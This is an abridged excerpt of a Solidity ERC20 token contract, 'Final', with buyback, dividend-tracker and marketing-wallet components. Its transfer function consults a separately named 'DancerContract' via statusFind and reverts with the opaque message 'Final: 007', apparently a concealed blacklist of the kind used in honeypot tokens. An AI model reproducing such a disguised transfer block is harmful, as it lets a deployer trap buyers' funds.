...
contract FinalBuyBack is Ownable {
    using SafeMath for uint256;
...
contract DancerContract is Ownable {
    ...
    address public marketingWallet = 0x5b6619e2CFC9d7D5049b7fBc7b5F5183dC244c58;
...
contract Final is ERC20, Ownable {
    ...
    FinalRewardsTracker public rewardsTracker;
    
    FinalBuyBack public buyBackContract;
    ...
    address payable public marketingWallet = 0x5b6619e2CFC9d7D5049b7fBc7b5F5183dC244c58;
    ...
    constructor() ERC20("Final", "FINAL") {
        totalFees = rewardsFee.add(liquidityFee);

    	liquidityWallet = owner();

        rewardsTracker = new FinalRewardsTracker();
        
        buyBackContract = new FinalBuyBack();
    ...
    function _transfer(
        ...
        require(!dancer.statusFind(from), "Final: 007");
        
        if(!tradingIsEnabled) {
            require(canTransferBeforeTradingIsEnabled[from], "Final: This account cannot send tokens until trading is enabled");
        }
        ...
        rewardsTracker.updateFinalBalance(payable(from), balanceOf(from));
        rewardsTracker.updateFinalBalance(payable(to), balanceOf(to));
...
contract FinalRewardsTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    mapping (address => uint256) public finalBalance;
    ...
    constructor() DividendPayingToken("FinalRewardsTracker", "FinalRewardsTracker") {
    ...
    function _transfer(address, address, uint256) internal pure override {
        require(false, "FinalRewardsTracker: No transfers allowed");
    }

    function withdrawDividend() public pure override {
        require(false, "FinalRewardsTracker: Use the 'claim' function on the main Final contract.");
    }
    ...
    function updateFinalBalance(address payable holder, uint256 shares) external onlyOwner {
        finalBalance[holder] = shares;
    }
    ...
    function setBalance(address payable account) public onlyOwner {
    	...
    	uint256 newBalanceWithOffset = finalBalance[account].add(offset[account]);
